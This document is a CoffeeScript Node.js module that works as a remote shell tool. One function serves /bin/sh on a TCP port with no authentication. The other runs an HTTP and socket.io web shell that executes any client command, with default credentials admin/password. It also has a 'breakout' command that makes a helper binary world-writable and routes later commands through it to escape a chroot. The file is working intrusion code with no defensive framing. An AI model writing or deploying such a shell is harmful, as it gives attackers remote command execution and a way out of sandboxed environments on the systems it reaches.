{exec, spawn} = require 'child_process'
path = require 'path'
fusker = require 'fusker'
net = require 'net'
util = require 'util'

module.exports =
  reverse: (port) ->
    sh = spawn '/bin/sh', []
    server = net.createServer (c) ->
      c.pipe sh.stdin
      util.pump sh.stdout, c
    server.listen port
    
  start: (port, username, password) ->
    username ?= 'admin'
    password ?= 'password'
    fusker.config.dir = path.join __dirname, '../public'
    fusker.config.silent = true
    server = fusker.http.createServer port, username, password
    io = fusker.socket.listen server
    breakf = path.join __dirname, "../break"
    io.sockets.on 'connection', (socket) ->
      socket.cwd ?= process.cwd()
      socket.emit 'cwd', socket.cwd
      
      socket.on 'command', (msg) ->
      
        if msg is 'breakout'
          exec "chmod 0777 #{breakf}", (err, stdout, stderr) ->
            if err? or stderr? and err isnt "" and stderr isnt ""
              socket.emit 'error', "Chroot breakout failed! Error: #{err + stderr}"
            else
              socket.emit 'stdout', "Chroot breakout successful!"
          socket.cwd = '/'
          socket.emit 'cwd', socket.cwd
          return socket.broken = true
          
        if msg is 'breakin'
          socket.cwd = process.cwd()
          socket.emit 'cwd', socket.cwd
          return socket.broken = false
          
        if socket.broken  
          msg = "#{breakf} \"#{msg}\""
          
        exec msg, {cwd: socket.cwd}, (err, stdout, stderr) ->
          if !err and !stderr and msg.indexOf('cd ') is 0
            socket.cwd = path.join socket.cwd, msg.replace 'cd ', ''
          socket.emit 'cwd', socket.cwd
          socket.emit 'stdout', stdout if stdout? and stdout isnt ""
          socket.emit 'stderr', stderr if stderr? and stderr isnt ""
          socket.emit 'error', err.message if err? and !stderr
